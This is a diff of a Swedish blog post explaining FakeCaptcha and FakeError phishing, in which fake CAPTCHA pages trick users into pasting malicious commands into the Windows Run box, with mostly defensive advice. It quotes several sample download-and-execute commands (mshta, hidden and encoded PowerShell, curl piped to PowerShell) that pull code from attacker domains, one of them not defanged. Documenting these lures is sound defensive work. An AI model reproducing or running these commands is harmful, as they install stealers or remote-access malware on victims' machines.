@@ -11,24 +11,24 @@ image: assets/img/phish_cam_1-768x768.jpeg
 
 {% raw %}
 ## Fakecaptcha
-Denna bloggen kommer innehålla kortfattad information som jag har hittat när det gäller FakeCaptcha Phishing.
+Denna blogg kommer innehålla kortfattad information som jag har hittat om FakeCaptcha‑phishing.
 
 
-FakeCaptcha är en phishing metod som använder captcha på för att lura användarna att själv skriva in illvillig powershell kod i sin dator.
-Hemsidan kommer visa en fake captcha och för att komma vidare till den "riktiga hemsidan" måste man bevisa att man är inte en robot genom att följa instruktionerna.
+FakeCaptcha är en phishingmetod som använder CAPTCHA för att lura användarna att själva skriva in illvillig PowerShell‑kod på sin dator.
+Hemsidan visar en falsk CAPTCHA och för att komma vidare till den "riktiga hemsidan" måste man bevisa att man inte är en robot genom att följa instruktionerna.
 
 ![Fakecaptchaps1](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/25/e/unmasking-fake-captcha-cases-in-mxdr-investigations/Fig-10.png)
 
 Instruktionerna
-1. WIN + R            -- Öppnar Run boxen i Windows
-2. CTRL + V           -- Klistrar in en illvillig powershell kod i run boxen
-3. Enter              -- För att köra koden i run
+1. WIN + R            -- Öppnar Run‑rutan i Windows
+2. CTRL + V           -- Klistrar in en illvillig PowerShell‑kod i Run‑rutan
+3. Enter              -- För att köra koden i Run
 
 
-Om du undrar hur koden blev kopierad i första hand är de för att användaren tryckte "Im not a robot" eller "Verify" först, innan instruktionerna dök upp..
-Den Kopieras i smyg utan användarens kunskap.
+Om du undrar hur koden blev kopierad från början är det för att användaren tryckte "I'm not a robot" eller "Verify" först, innan instruktionerna dök upp.
+Den kopieras i smyg utan användarens kunskap.
 
-Som bilden visar nedanför försöker hackarna ge användarna en falsk trygghet genom att visa bara en del av powershell koden som ser ut och vara äkta.
+Som bilden visar nedanför försöker hackarna ge användarna en falsk trygghet genom att bara visa en del av PowerShell‑koden som ser ut att vara äkta.
 
 
 
@@ -36,7 +36,7 @@ Som bilden visar nedanför försöker hackarna ge användarna en falsk trygghet 
 
 
 
-Nedanför finns det exempel på hur powershell koden kan se ut.
+Nedanför finns exempel på hur PowerShell‑koden kan se ut.
 
 
 
@@ -55,11 +55,11 @@ mshta.exe hxxps://welcome12-world[.]com/wpDoQRpZt2PIffud[.]html #'' I'm human ID
 
 mshta.exe hxxps://w19-seasalt[.]com/mbDjBsRmxM1LreEp[.]html #'' I'm human ID984662''
 
-PowerShell.exe -W Hidden -command $uri = 'hxxps[://]fessoclick[.]com/clck/dub.txt'; $content = (Invoke-WebRequest -Uri $uri).Content; Invoke-Expression $contentâ€
+PowerShell.exe -W Hidden -command $uri = 'hxxps[://]fessoclick[.]com/clck/dub.txt'; $content = (Invoke-WebRequest -Uri $uri).Content; Invoke-Expression $content"
 
-cmd /c "powershell -w h -e aQBlAHgAKABpAHcAcgAgAC0AVQByAGkAIAAnAGgAdAB0AHAAcwA6AC8ALwB2AGkAZQB3AGUAcgAtAHYAYwBjAHAAYQBzAHMALgBjAG8AbQAvAGkAbgAuAHAAaABwAD8AYQBjAHQAaQBvAG4APQAxACcAKQA=" && âœ… I am not a robot - reCAPTCHA ID: 7845
+cmd /c "powershell -w h -e aQBlAHgAKABpAHcAcgAgAC0AVQByAGkAIAAnAGgAdAB0AHAAcwA6AC8ALwB2AGkAZQB3AGUAcgAtAHYAYwBjAHAAYQBzAHMALgBjAG8AbQAvAGkAbgAuAHAAaABwAD8AYQBjAHQAaQBvAG4APQAxACcAKQA=" && ✅ I am not a robot - reCAPTCHA ID: 7845
 
-mshta hxxps://check[.]nejyd[.]icu/gkcxv[.]google?i=db47f2d4-a1c2-405f-ba9f-8188d2da9156 REM âœ… Human, not a robot: Verification Ð¡ÐÐ TCHA ID:658630
+mshta hxxps://check[.]nejyd[.]icu/gkcxv[.]google?i=db47f2d4-a1c2-405f-ba9f-8188d2da9156 REM ✅ Human, not a robot: Verification Ð¡ÐÐ TCHA ID:658630
 
 PoWeRsHeLl -w h -c cUr"L.E"x"E" -k -L
 hxxp"s://ka"j"e"c.icu"/f"04b18c2f7ff"48bdbf06"701"38"f9eb2"4f.txt | pow"e"rs"h"el"l" -
@@ -67,16 +67,16 @@ hxxp"s://ka"j"e"c.icu"/f"04b18c2f7ff"48bdbf06"701"38"f9eb2"4f.txt | pow"e"rs"h"e
 ```
 
 
-Ett av hackarnas mål är att försöka få användarna tro att hemsidan och att instruktionerna är äkta och det gör dom genom att ändra domän namnet till nåt som ser äkta ut oftast använder dom populära hemsidor som facebook eller microsoft. 
+Ett av hackarnas mål är att få användarna att tro att hemsidan och instruktionerna är äkta. Det gör de genom att ändra domännamnet till något som ser äkta ut. Ofta använder de populära hemsidor som Facebook eller Microsoft. 
 
-Så som bilden visar nedanför gör dom backgrunden till den riktiga hemsidan fast suddig.
+Som bilden visar nedanför gör de bakgrunden till den riktiga hemsidan suddig.
 
 ![FakeCaptcha](https://www.york.ac.uk/media/it-services/images/about/news/2025/Fake%20captcha,%20full%20browser.png)
 
 ## FakeError
 
-Fake error är princip samma sak som FakeCaptcha en skillnaden är att den spelar på användarens rädsla att nånting har gått fel.
-För att övertyga användaren mer så låser hemsidan sig själv i fullskärm.
+Fake error är i princip samma sak som FakeCaptcha, men skillnaden är att den spelar på användarens rädsla att något har gått fel.
+För att övertyga användaren mer låser hemsidan sig själv i fullskärm.
 Exempel på FakeError nedanför.
 
 
@@ -86,47 +86,47 @@ Exempel på FakeError nedanför.
 
 
 ## Initial Access
-En Lista för hackarnas olika sätt att sprida FakeCaptcha / FakeError hemsidorna
+En lista över hackarnas olika sätt att sprida FakeCaptcha/FakeError‑hemsidorna
 - Äkta sidor som ersätts av FakeCaptcha / FakeError
 - Malvertising / SEO-poisoning
-- Redirictions
+- Redirects
 - Fake tech support / tutorials
-- E-mail
+- E‑post
 
 ## Stoppa FakeCaptcha innan det händer
 
 ### 1. Känn igen mönstret direkt
-- CAPTCHA som säger **Win+R â†’ Ctrl+V â†’ Enter** = 99,9 % bluff  
-- Samma sak med: â€œdu är infekteradâ€, â€œfixa fel nuâ€, â€œverify humanâ€, â€œsäkerhetsuppdateringâ€ + instruktioner till Run eller Terminal
+- CAPTCHA som säger **Win+R → Ctrl+V → Enter** = 99,9 % bluff  
+- Samma sak med: "du är infekterad", "fixa fel nu", "verify human", "säkerhetsuppdatering" + instruktioner till Run eller Terminal
 
 ### 2. Avbryt korrekt (utan att köra något)
 - Stäng fliken eller hela webbläsaren  
-- Poppar helskärm eller blockerar? â†’ **Alt+F4** / **Ctrl+W** / döda processen i Aktivitetshanteraren
+- Poppar helskärm eller blockerar? → **Alt+F4** / **Ctrl+W** / döda processen i Aktivitetshanteraren
 
 ### 3. Clipboard är fienden
 De flesta varianter fyller urklippet med skadlig kommandorad.  
 Vanor som räddar dig:
 - Klistra **aldrig** in okänd text i Run / PowerShell / Terminal  
-- Misstänker du manipulation? Kopiera ett enda ord (typ â€œtestâ€) först â†’ då skriver du över skiten
+- Misstänker du manipulation? Kopiera ett enda ord (typ "test") först → då skriver du över skiten
 
 ### 4. Minska ytan
 FakeCaptcha kommer oftast via malvertising, phishing eller hackade sajter.  
 Gör det svårare:
 - Håll webbläsare + OS uppdaterade  
 - Använd uBlock Origin / reklamblockerare  
-- Var allergisk mot â€œgratis filmerâ€, torrent-sidor, â€œPC supportâ€-popups, exempel på bilden nedanför.
+- Var allergisk mot "gratis filmer", torrent-sidor, "PC support"-popups, exempel på bilden nedanför.
 ![FakeErrorBild](https://its.uky.edu/sites/default/files/styles/max_650x650/public/2023-06/fake_microsoft_support_site.webp?itok=WAwygnyQ)
 
 ### 5. För företag / sysadmins
-Vanliga FakeCaptcha-kedjor använder lolbins (living-off-the-land).  
+Vanliga FakeCaptcha‑kedjor använder LOLBins (living-off-the-land).  
 Bra snabba wins:
 - Logga / begränsa PowerShell (särskilt -EncodedCommand / -WindowStyle Hidden)  
-- EDR-regel: larma på explorer.exe â†’ powershell.exe / mshta.exe med suspekt cmdline  
-- Träna användare: â€œriktig CAPTCHA ber dig aldrig öppna Körâ€
+- EDR‑regel: larma på explorer.exe → powershell.exe / mshta.exe med suspekt cmdline  
+- Träna användare: "riktig CAPTCHA ber dig aldrig öppna Kör"
 
 ### 6. Redan kört kommandot? Paniksteg
 1. Koppla ur nätet direkt  
-2. Kör full scan (helst EDR eller bra AV)  
+2. Kör fullständig skanning (helst EDR eller bra AV)  
 3. Byt lösenord från en **annan, ren** dator (särskilt mail, bank, Microsoft-konto etc)
 
 ## Är domänen legitim? Snabb koll
@@ -166,18 +166,18 @@ Klistra bara in **domännamnet** (inget mer) så kör jag checklistan och säger
 
 ## Tricks hackarna har använt sig av
 
-Dom använder även andra metoder för att förhindra att bli påkommna av säkerhets företagen gemom att använda Cloudflare captcha på deras egna illvilliga hemsida, för att sen förhindra web crawlers av säkerhets företagen att hitta deras skadlig kod.
+De använder även andra metoder för att förhindra att bli påkomna av säkerhetsföretagen genom att använda Cloudflare‑CAPTCHA på deras egna illvilliga hemsida, för att sedan hindra webbcrawlers från säkerhetsföretagen att hitta deras skadliga kod.
 
 
 
 ## Konsekvenserna
-Virusen som blir installerad är oftast Stealers eller RAT som sen leder till konto kappning, bedrägeri eller crypto mining
+Virusen som installeras är oftast stealers eller RAT som sedan leder till kontokapning, bedrägeri eller kryptomining.
 
 
 
 ### Labbidé
-Göra en enkel version av detta med hjälp av attack och defend vm's 
-Öppna calculator på defend vm från attack vm. 
+Göra en enkel version av detta med hjälp av attack‑ och defend‑VM:er. 
+Öppna Kalkylatorn på defend‑VM från attack‑VM. 
 
 
 
